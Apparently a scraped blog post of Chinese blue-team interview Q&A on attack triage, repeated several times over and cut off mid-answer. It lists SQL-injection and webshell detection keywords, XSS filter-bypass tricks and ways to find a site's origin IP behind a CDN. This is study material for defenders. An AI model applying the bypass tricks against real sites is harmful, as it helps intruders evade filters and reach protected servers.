通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#3常用的webshell检测工具"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#4struts2命令执行的流量特征"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#5确定红队在打服务器而且进行文件上传的操作怎么判断是不是webshell"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#6liunx系统中任何权限都能访问的临时文件位置"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#7如何判断是钓鱼邮件"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 由于webshell内需要执行对应的功能，例如命令执行，连接数据库等，所以文件内容中会存在相关的函数关键字，如：Runtime.getRuntime()、eval()、system、request()等 一般webshell里可能有对应的访问控制，所以内容中可能会包含username、password字样。 （6）Liunx系统中任何权限都能访问的临时文件位置答：/var/tmp （7）如何判断是钓鱼邮件 以公司某部门的名义，如安全部、综合部，使用正式的语气，内容涉及到账号和密码等敏感信息，可能带有链接地址或附件，制造紧张氛围，比如24小时内今日下班前完整账号密码修改。 看发件人 设备上也会报IP 上微步查一下IP是不是恶意IP 邮件的发件人和内容是不是正常的业务往来 附件放到沙箱里 看看是否有问题 有的邮件会提示你邮件由另一个邮箱代发，或者邮箱地址不是本公司的，再或者邮箱地址是qq或者163等个人邮箱的，那就更没跑了 （8）WAF和IPS的区别答：IPS位于防火墙和网络的设备之间，防火墙可以拦截底层攻击行为，但对应用层 的深层攻击行为无能为力。IPS是对防火墙的补充。综合能力更强一些；WAF是工作在应用层的防火墙，主要对web请求/响应进行防护。 （9）拿到日志如何分析 特征字符分析 在日志中寻找已知的漏洞特征 访问频率分析 在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征 漏洞扫描检查 可以匹配user-agent特征的方式进行检测 暴力破解检测 webshell检测 （10）SQL注入有哪些常见的特征？ **一些常见的关键字：**select,where、order、union、update、floor、exec、information_schema、extractvalue、delete、insert、ascii、table、from等 **一些常见的sql函数：**user()、@@version、ctxsys.drithsx.sn()等针对双引号、单引号、等号之类的符号，可能会进行相关的编码操作，例如url编码，需要注意。 （11）XSS弹窗函数和常见的XSS绕过策略？ **弹窗函数：**alert、confirm、prompt、onclick **绕过策略：**大小写混写；双写；；%0a或者%0d绕过；拼凑绕过 （12）无文件Webshell实现的方式有哪些？ 基于servlet规范，通过动态注册Servlet、Filter、Listener等实现无文件webshell 基于特定框架，如 Spring 框架下动态注册 Controller 等。 基于 JAVA Agent，如 memShell （13）响应状态码都有哪些？不管是对于什么 WEB 漏洞攻击的研判，响应状态码都是研判成功与否的首要研判依据， 如果响应状态码为 404 基本可以研判攻击失败，也就无需再根据请求响应等进一步研判了。（当然，这并不是绝对的，也有例外的情况，攻击者在一些情况下也可以篡改响应状态码， 如 WebShell 的响应状态码。现在这种情况不多见，暂时可以先不考虑） **404：**404 状态码表示请求资源不存在，即表示攻击失败； **200：**200 状态码表示请求成功，但是请求成功并不代表攻击成功，具体需要结合请求与 响应进行判断 **401：**401 状态表示未授权状态。该状态码返回常见于 HTTP 的 Basic 认证。 **500：**500 状态码表示服务器内部错误，通常漏洞攻击也会导致出现 500 错误，但是出现 500 错误并不表示攻击失败，需要根据实际情况研判。 **301：**本状态码将浏览器【永久重定向】到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。 **302：**本状态码将浏览器【暂时重定向】到另外一个在Location消息头中指定的URL.客户端应在随后的请求中恢复使用原始URL. （14）发现一个SQL注入告警怎么判断？天眼告警页面有一个查看详情，可以打开具体的流量包，先看请求头和请求体是否含有SQL注入常用的SQL语句，比如and 1=1 ，比如sleep，比如updatexml等，如果有的话，说明是攻击，然后看响应，响应状态码为404这种情况，就是没有利用成功，如果是响应码是200，就看响应体内容，看是否包含查询出的预期结果，如果含有预期结果，则攻击成功，处置的话，先申请封禁IP，然后向客户申请对相关服务下架处理，然后对漏洞进行修复，如果被爆出了账号，需要修改密码。 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:1:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#8waf和ips的区别"},{"categories":["hvv"],"content":"\r攻击研判\r（1）怎么确定是真实攻击还是误报？ 通过设备的告警信息，流量特征（攻击特征），去查看数据包里面（请求包、请求体、返回包、返回体），是否存在相应的攻击特征，如果不包含攻击载荷，为误报 以攻击IP为索引，去查看（护网开始-现在），是否有其它攻击行为。 查看攻击方向：内对内、内对外、外对内。内对内的话误报率较大，但也要看具体的流量，最好上机排查。 本地复现：不用客户的网络去访问，可以用其他的网络，比如手机热点。 （2）cdn如何绕过？ 通过境外 ip 去平目标系统 主动向我方的请求，如发邮件 获取多个子域名 ip 对比 查看 dns 记录 通过网络搜索引擎去搜索 （3）常用的Webshell检测工具 D盾 河马WEBSHELL Web shell Detector PHP Malware Finder （4）struts2命令执行的流量特征一般Struts2框架的接口会以.do、.action结尾；struts2一些常见的关键字：memberAcecess,getRuntime,println,双引号，单引号，等号，括号之类的符号。 （5）确定红队在打服务器，而且进行文件上传的操作，怎么判断是不是webshell？ 一般webshell文件名后缀为jsp、php、py、asp等； 上传的文件如果是被加密的，可能是webshell,因为正常的操作一般不会上传脚本文件，加密的原因是因为过查杀，正常文件是不需要过查杀的。 